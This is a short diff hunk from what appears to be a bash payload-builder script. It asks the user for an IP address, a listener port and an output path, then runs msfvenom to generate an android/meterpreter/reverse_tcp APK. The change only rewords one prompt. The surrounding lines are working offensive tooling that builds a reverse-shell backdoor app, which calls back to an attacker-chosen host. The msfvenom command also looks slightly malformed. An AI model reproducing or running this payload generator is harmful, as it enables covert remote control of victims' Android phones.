@@ -46,7 +46,7 @@ esac
 
 read -p "    Enter your IP Address ===> " ip
 read -p "    Enter listener port ===> " Port  
-read -p "|---Enter the name or path to save the payload
+read -p "|---Set the name and path to save the payload
 |----> " Path               
 msfvenom -p android/meterpreter/reverse_tcp lhost=$ip lport=$Port - apk -o $Path
 clear
